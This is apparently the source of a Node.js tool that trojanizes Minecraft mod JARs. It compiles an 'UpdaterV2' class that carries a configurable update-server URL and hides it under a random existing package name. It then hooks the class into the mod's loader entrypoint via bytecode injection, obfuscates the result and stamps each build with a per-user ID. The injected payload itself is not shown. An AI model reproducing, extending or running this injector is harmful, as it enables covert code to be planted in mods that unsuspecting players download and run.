const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const crypto = require("crypto");
const AdmZip = require("adm-zip");
const { execFileSync } = require("child_process");
const ENABLE_obf2 = 1;

console.log("====================================");
console.log(" SMART FABRIC INJECTOR (bytecode edition)");
console.log("====================================");

if (process.argv.length < 3) {
  console.log(
    "[ERROR] Usage: node index.js <mod.jar> [userId] [outputDir] [updateServerUrl]",
  );
  process.exit(1);
}

const targetJar = process.argv[2];
const userId = process.argv[3] || process.env.BUILD_USER_ID || "";
const outputDir = process.argv[4] || process.env.BUILD_OUTPUT_DIR || "";
const updateServerUrl =
  process.argv[5] ||
  process.env.BUILD_UPDATE_SERVER_URL ||
  "";

console.log("[DEBUG] Target: " + targetJar);
console.log("[DEBUG] User ID: " + userId);
console.log("[DEBUG] Output Dir: " + outputDir);
console.log("[DEBUG] Update Server URL: " + updateServerUrl);

function getJavaRelease() {
  if (process.env.INJECTOR_JAVA_RELEASE) {
    return process.env.INJECTOR_JAVA_RELEASE;
  }
  try {
    const versionOutput = require("child_process")
      .execSync("javac -version", { stdio: "pipe" })
      .toString("utf8");
    const match = versionOutput.match(/javac\s+(\d+)/);
    if (match) {
      const major = parseInt(match[1], 10);
      if (major === 1) {
        const subMatch = versionOutput.match(/javac\s+1\.(\d+)/);
        if (subMatch) return subMatch[1];
      }
      return String(major);
    }
  } catch (e) {
    // Fallback
  }
  return "17";
}
const JAVA_RELEASE = getJavaRelease();
console.log("[DEBUG] Using Java Release: " + JAVA_RELEASE);

function run(command, args) {
  execFileSync(command, args, { stdio: "inherit" });
}

function randomIdentifier(prefix) {
  return `${prefix}${crypto.randomBytes(4).toString("hex")}`;
}

function getRandomExistingPackage(zip) {
  const classEntries = zip
    .getEntries()
    .map((e) => e.entryName)
    .filter(
      (name) =>
        name.endsWith(".class") &&
        name.includes("/") &&
        !name.startsWith("META-INF/"),
    );

  if (classEntries.length === 0) {
    return "net.minecraft";
  }

  const randomClass =
    classEntries[Math.floor(Math.random() * classEntries.length)];

  return path.dirname(randomClass).replace(/\//g, ".");
}

function buildUpdaterV2(sourcePath, zip, updateServerUrl) {
  console.log(updateServerUrl);
  const packageName = getRandomExistingPackage(zip);
  const internalName = `${packageName.replace(/\./g, "/")}/UpdaterV2`;
  const buildRoot = fs.mkdtempSync(path.join(os.tmpdir(), "UpdaterV2-"));
  const sourceDir = path.join(buildRoot, ...packageName.split("."));
  const classesDir = path.join(buildRoot, "classes");
  fs.mkdirSync(sourceDir, { recursive: true });
  fs.mkdirSync(classesDir, { recursive: true });

  let originalSource = fs.readFileSync(sourcePath, "utf8");
  if (updateServerUrl) {
    originalSource = originalSource.replace(
      "PLACEHOLDER_UPDATE_SERVER_URL",
      updateServerUrl,
    );
  }
  originalSource = originalSource.replace(/^\s*package\s+[\w.]+\s*;\s*/m, "");
  const generatedSource = `package ${packageName};${os.EOL}${os.EOL}${originalSource}`;
  const generatedSourcePath = path.join(sourceDir, "UpdaterV2.java");
  fs.writeFileSync(generatedSourcePath, generatedSource, "utf8");

  run("javac", [
    "--release",
    JAVA_RELEASE,
    "-d",
    classesDir,
    generatedSourcePath,
  ]);

  const classPath =
    path.join(classesDir, ...internalName.split("/")) + ".class";
  if (!fs.existsSync(classPath)) {
    throw new Error("Generated UpdaterV2 class missing: " + classPath);
  }

  return {
    internalName,
    binaryName: internalName.replace(/\//g, "."),
    jarEntry: `${internalName}.class`,
    classData: fs.readFileSync(classPath),
    classPathTmp: classPath,
  };
}

// --------------------------------------------------
// 1. Validate inputs
// --------------------------------------------------
if (!fs.existsSync(targetJar)) {
  console.log("[ERROR] JAR not found");
  process.exit(1);
}
const UpdaterV2Java = "UpdaterV2.java";
if (!fs.existsSync(UpdaterV2Java)) {
  console.log("[ERROR] Missing source: " + UpdaterV2Java);
  process.exit(1);
}
const zip = new AdmZip(targetJar);
console.log("[DEBUG] Opened JAR");

let UpdaterV2;
try {
  UpdaterV2 = buildUpdaterV2(UpdaterV2Java, zip, updateServerUrl);
} catch (e) {
  console.log("[ERROR] Failed compiling UpdaterV2.java");
  throw e;
}
console.log("[DEBUG] Built UpdaterV2.class at " + UpdaterV2.internalName);

// --------------------------------------------------
// 2. Open JAR
// --------------------------------------------------

// --------------------------------------------------
// 3. Prepare generated UpdaterV2 class
// --------------------------------------------------
if (zip.getEntry(UpdaterV2.jarEntry)) {
  zip.deleteFile(UpdaterV2.jarEntry);
}
console.log("[DEBUG] Prepared injd class entry: " + UpdaterV2.jarEntry);

// --------------------------------------------------
// 4. Detect Mod Loader and Extract Entrypoints
// --------------------------------------------------
let loaderType = "unknown";
let fabricJson = null;
let quiltJson = null;
let targetClassName = "auto";
let targetMethodName = "auto";

const fabricEntry = zip.getEntry("fabric.mod.json");
const quiltEntry = zip.getEntry("quilt.mod.json");
const forgeEntry = zip.getEntry("META-INF/mods.toml");
const neoforgeEntry = zip.getEntry("META-INF/neoforge.mods.toml");
const mcmodEntry = zip.getEntry("mcmod.info");

if (fabricEntry) {
  loaderType = "fabric";
  console.log("[DEBUG] Detected Fabric loader via fabric.mod.json");
  try {
    fabricJson = JSON.parse(fabricEntry.getData().toString("utf8"));
  } catch (e) {
    console.log("[WARN] Failed parsing fabric.mod.json: " + e.message);
  }
} else if (quiltEntry) {
  loaderType = "quilt";
  console.log("[DEBUG] Detected Quilt loader via quilt.mod.json");
  try {
    quiltJson = JSON.parse(quiltEntry.getData().toString("utf8"));
  } catch (e) {
    console.log("[WARN] Failed parsing quilt.mod.json: " + e.message);
  }
} else if (neoforgeEntry) {
  loaderType = "neoforge";
  console.log(
    "[DEBUG] Detected NeoForge loader via META-INF/neoforge.mods.toml",
  );
} else if (forgeEntry) {
  loaderType = "forge";
  console.log("[DEBUG] Detected Forge loader via META-INF/mods.toml");
} else if (mcmodEntry) {
  loaderType = "forge-legacy";
  console.log("[DEBUG] Detected Forge (Legacy) loader via mcmod.info");
} else {
  console.log(
    "[DEBUG] No mod metadata files found. Relying on auto-detection scanning.",
  );
}

if (loaderType === "fabric" && fabricJson) {
  const PRIORITY = ["client", "main", "server", "preLaunch"];
  let selectedType = null;
  for (const type of PRIORITY) {
    if (
      fabricJson.entrypoints?.[type] &&
      Array.isArray(fabricJson.entrypoints[type]) &&
      fabricJson.entrypoints[type].length > 0
    ) {
      selectedType = type;
      break;
    }
  }
  if (selectedType) {
    const rawEntry = fabricJson.entrypoints[selectedType][0];
    if (typeof rawEntry === "string") {
      if (rawEntry.includes("::")) {
        [targetClassName, targetMethodName] = rawEntry.split("::");
      } else {
        targetClassName = rawEntry;
        const defaultMethods = {
          client: "onInitializeClient",
          main: "onInitialize",
          server: "onInitializeServer",
          preLaunch: "onPreLaunch",
        };
        targetMethodName = defaultMethods[selectedType] || "onInitialize";
      }
    }
  } else {
    console.log(
      "[WARN] Fabric mod has no entrypoints in metadata. Auto-scanning will be used.",
    );
  }
} else if (loaderType === "quilt" && quiltJson) {
  const quiltLoader = quiltJson.quilt_loader || {};
  const entrypoints = quiltLoader.entrypoints || quiltJson.entrypoints || {};
  const PRIORITY = ["client_init", "init", "main", "client", "server"];
  let selectedType = null;
  for (const type of PRIORITY) {
    if (entrypoints[type]) {
      if (Array.isArray(entrypoints[type]) && entrypoints[type].length > 0) {
        selectedType = type;
        break;
      } else if (typeof entrypoints[type] === "string") {
        selectedType = type;
        break;
      }
    }
  }
  if (selectedType) {
    let rawEntry = entrypoints[selectedType];
    if (Array.isArray(rawEntry)) {
      rawEntry = rawEntry[0];
    }
    if (typeof rawEntry === "string") {
      if (rawEntry.includes("::")) {
        [targetClassName, targetMethodName] = rawEntry.split("::");
      } else {
        targetClassName = rawEntry;
        const defaultMethods = {
          client_init: "onInitializeClient",
          init: "onInitialize",
          client: "onInitializeClient",
          main: "onInitialize",
          server: "onInitializeServer",
        };
        targetMethodName = defaultMethods[selectedType] || "onInitialize";
      }
    }
  } else {
    console.log(
      "[WARN] Quilt mod has no entrypoints in metadata. Auto-scanning will be used.",
    );
  }
}

const enableobf2 = String(process.env.ENABLE_obf2 || "0") === "1";
const extractedMixinClasses = enableobf2
  ? extractMixinClasses(zip, fabricJson, quiltJson)
  : [];

// --------------------------------------------------
// 5. Execute Bytecode Injection via Java tool
// --------------------------------------------------
const targetBasename = path.basename(targetJar, ".jar");
const outDir = outputDir ? path.resolve(outputDir) : path.dirname(targetJar);
if (outputDir && !fs.existsSync(outDir)) {
  fs.mkdirSync(outDir, { recursive: true });
}
const injdOutput = path.join(outDir, `${targetBasename}-injd.jar`);

console.log("[DEBUG] Executing ByteCodeInjector JAR patching...");
const cpSeparator = process.platform === "win32" ? ";" : ":";
const classpath = `.${cpSeparator}lib/asm-9.6.jar`;

try {
  run("java", [
    "-cp",
    classpath,
    "ByteCodeInjector",
    targetJar,
    injdOutput,
    UpdaterV2.internalName,
    targetClassName,
    targetMethodName,
    UpdaterV2.classPathTmp,
    UpdaterV2.jarEntry,
  ]);
} catch (e) {
  console.log("[ERROR] ByteCodeInjector execution failed");
  console.error(e);
  process.exit(1);
}

// --------------------------------------------------
// 6. Obfuscation stage (obf2; loader-safe defaults)
// --------------------------------------------------
const downloadUrl = "https://example.com/fabric-obf.jar";

function fetchFile(url, outPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outPath);
    https
      .get(url, (res) => {
        if (
          res.statusCode >= 300 &&
          res.statusCode < 400 &&
          res.headers.location
        ) {
          file.close();
          fs.unlinkSync(outPath);
          fetchFile(res.headers.location, outPath).then(resolve).catch(reject);
          return;
        }
        if (res.statusCode !== 200) {
          reject(new Error("Download failed with status " + res.statusCode));
          return;
        }
        res.pipe(file);
        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        try {
          file.close();
        } catch (_) {}
        if (fs.existsSync(outPath)) fs.unlinkSync(outPath);
        reject(err);
      });
  });
}

function resolveobf2Jar() {
  const explicitJar = process.env.obf2_JAR;
  if (explicitJar && fs.existsSync(explicitJar)) return explicitJar;

  const localJar = path.join(process.cwd(), "fabric-obf.jar");
  if (fs.existsSync(localJar)) return localJar;
  return null;
}

function extractMixinClasses(zip, fabricJson, quiltJson) {
  const classes = new Set();
  const mixinFiles = new Set();

  if (fabricJson && fabricJson.mixins) {
    for (const mixinFile of fabricJson.mixins) {
      if (typeof mixinFile === "string") mixinFiles.add(mixinFile);
      else if (mixinFile && typeof mixinFile.config === "string")
        mixinFiles.add(mixinFile.config);
    }
  }

  if (quiltJson) {
    const mixins =
      quiltJson.mixin ||
      quiltJson.mixins ||
      quiltJson.quilt_loader?.mixin ||
      quiltJson.quilt_loader?.mixins;
    if (Array.isArray(mixins)) {
      for (const mixinFile of mixins) {
        if (typeof mixinFile === "string") mixinFiles.add(mixinFile);
        else if (mixinFile && typeof mixinFile.config === "string")
          mixinFiles.add(mixinFile.config);
      }
    }
  }

  zip.getEntries().forEach((entry) => {
    if (entry.entryName.endsWith(".mixins.json")) {
      mixinFiles.add(entry.entryName);
    }
  });

  for (const mixinFile of mixinFiles) {
    const mixinEntry = zip.getEntry(mixinFile);
    if (!mixinEntry) continue;
    try {
      const mixJson = JSON.parse(mixinEntry.getData().toString("utf8"));
      const pkg = mixJson.package || "";
      const allMixins = [
        ...(Array.isArray(mixJson.client) ? mixJson.client : []),
        ...(Array.isArray(mixJson.mixins) ? mixJson.mixins : []),
        ...(Array.isArray(mixJson.server) ? mixJson.server : []),
      ];
      for (const name of allMixins) {
        if (typeof name !== "string") continue;
        classes.add(pkg ? `${pkg}.${name}` : name);
      }
    } catch (e) {
      console.log("[WARN] Failed parsing mixin file: " + mixinFile);
    }
  }
  return [...classes];
}

async function ensureobf2Jar() {
  let pgJar = resolveobf2Jar();
  if (pgJar) return pgJar;
  const localJar = path.join(process.cwd(), "fabric-obf.jar");

  console.log("[INFO] obf2.jar not found, downloading obf2...");
  await fetchFile(downloadUrl, localJar);
  pgJar = resolveobf2Jar();
  return pgJar;
}

function checkJava21OrHigher(javaPath) {
  try {
    const result = require("child_process").spawnSync(javaPath, ["-version"], {
      timeout: 2000,
    });
    const combined =
      (result.stdout ? result.stdout.toString("utf8") : "") +
      (result.stderr ? result.stderr.toString("utf8") : "");
    return isVersion21OrHigher(combined);
  } catch (e) {
    // Ignore errors and return false
  }
  return false;
}

function isVersion21OrHigher(versionStr) {
  const match =
    versionStr.match(/(?:version|build)\s+["']?(\d+)/i) ||
    versionStr.match(/(\d+)\.\d+\.\d+/);
  if (match) {
    const major = parseInt(match[1], 10);
    return major >= 21;
  }
  return false;
}

function findJava21OrHigher() {
  if (checkJava21OrHigher("java")) {
    return "java";
  }

  if (process.env.JAVA_HOME) {
    const javaExe = process.platform === "win32" ? "java.exe" : "java";
    const javaPath = path.join(process.env.JAVA_HOME, "bin", javaExe);
    if (fs.existsSync(javaPath) && checkJava21OrHigher(javaPath)) {
      return javaPath;
    }
  }

  const pathsToSearch = [];
  if (process.platform === "win32") {
    const programFiles = process.env.ProgramFiles || "C:\\Program Files";
    const userHome = os.homedir();

    const searchRoots = [
      path.join(programFiles, "Java"),
      path.join(programFiles, "Eclipse Adoptium"),
      path.join(programFiles, "Microsoft"),
      path.join(programFiles, "Amazon Corretto"),
      path.join(programFiles, "BellSoft"),
      path.join(userHome, ".jdks"),
      path.join(userHome, "AppData\\Local\\Programs\\Adoptium"),
    ];

    for (const root of searchRoots) {
      if (fs.existsSync(root)) {
        try {
          const dirs = fs.readdirSync(root);
          for (const dir of dirs) {
            const fullDir = path.join(root, dir);
            const javaExePath = path.join(fullDir, "bin", "java.exe");
            if (fs.existsSync(javaExePath)) {
              pathsToSearch.push(javaExePath);
            }
          }
        } catch (_) {}
      }
    }
  } else if (process.platform === "darwin") {
    const jvmRoot = "/Library/Java/JavaVirtualMachines";
    if (fs.existsSync(jvmRoot)) {
      try {
        const dirs = fs.readdirSync(jvmRoot);
        for (const dir of dirs) {
          const javaPath = path.join(jvmRoot, dir, "Contents/Home/bin/java");
          if (fs.existsSync(javaPath)) {
            pathsToSearch.push(javaPath);
          }
        }
      } catch (_) {}
    }
    const brewPaths = [
      "/opt/homebrew/opt/openjdk@21/bin/java",
      "/opt/homebrew/opt/openjdk/bin/java",
      "/usr/local/opt/openjdk/bin/java",
    ];
    pathsToSearch.push(...brewPaths);
  } else {
    const jvmRoots = ["/usr/lib/jvm", "/usr/lib64/jvm"];
    for (const root of jvmRoots) {
      if (fs.existsSync(root)) {
        try {
          const dirs = fs.readdirSync(root);
          for (const dir of dirs) {
            const javaPath = path.join(root, dir, "bin/java");
            if (fs.existsSync(javaPath)) {
              pathsToSearch.push(javaPath);
            }
          }
        } catch (_) {}
      }
    }
  }

  for (const javaPath of pathsToSearch) {
    if (checkJava21OrHigher(javaPath)) {
      return javaPath;
    }
  }

  return null;
}

async function runobf2(inputJar, mixinClasses) {
  const pgJar = await ensureobf2Jar();
  if (!pgJar) {
    console.log("[INFO] obf2.jar not found, skipping obfuscation stage");
    return inputJar;
  }

  const outputJar = inputJar.replace(/\.jar$/i, "-fabric-obf.jar");
  const seed = Math.floor(Math.random() * 1_000_000_000).toString();
  const aggressive = String(process.env.OBF2_AGGRESSIVE || "1") === "1";

  const javaBin = findJava21OrHigher();
  if (!javaBin) {
    throw new Error(
      "Obfuscation requires Java 21 or higher. No Java 21+ installation was detected. Please install Java 21 or set JAVA_HOME to a Java 21+ installation.",
    );
  }
  console.log("[DEBUG] Using Java 21+ path for obfuscation: " + javaBin);

  const args = [
    "-jar",
    pgJar,
    "--in",
    path.resolve(inputJar),
    "--out",
    path.resolve(outputJar),
    "--seed",
    seed,
    ...(aggressive ? ["--insane"] : []),
  ];

  run(javaBin, args);

  console.log("[DEBUG] obf2 output: " + outputJar);
  return outputJar;
}

let finalOutput = injdOutput;
(async () => {
  try {
    finalOutput = await runobf2(finalOutput, extractedMixinClasses);
  } catch (e) {
    console.log("[WARN] Obfuscation stage failed; keeping injd JAR.");
    console.log(String(e.message || e));
    finalOutput = injdOutput;
  }

  // 1. Embed user_id.txt inside the final JAR if userId is specified
  if (userId) {
    try {
      console.log("[DEBUG] Embedding user ID in JAR metadata...");
      const finalZip = new AdmZip(finalOutput);
      if (finalZip.getEntry("user_id.txt")) {
        finalZip.deleteFile("user_id.txt");
      }
      finalZip.addFile("user_id.txt", Buffer.from(userId, "utf8"));
      finalZip.writeZip();
      console.log("[DEBUG] Embedded user_id.txt inside " + finalOutput);
    } catch (zipErr) {
      console.log(
        "[WARN] Failed to embed user_id.txt in JAR: " + zipErr.message,
      );
    }
  }

  // 2. Copy/rename final output to a clean user-specific filename
  if (userId) {
    const cleanFinalOutput = path.join(
      outDir,
      `injected_mod_user_${userId}.jar`,
    );
    try {
      if (fs.existsSync(cleanFinalOutput)) {
        fs.unlinkSync(cleanFinalOutput);
      }
      fs.copyFileSync(finalOutput, cleanFinalOutput);
      console.log("[DEBUG] Copied final JAR to: " + cleanFinalOutput);
      finalOutput = cleanFinalOutput;
    } catch (copyErr) {
      console.log(
        "[WARN] Failed to copy final JAR to user name: " + copyErr.message,
      );
    }
  }

  console.log("");
  console.log("====================================");
  console.log("[SUCCESS] Injection complete");
  console.log("injd JAR: " + injdOutput);
  console.log("Final JAR: " + finalOutput);
  console.log("====================================");
})();
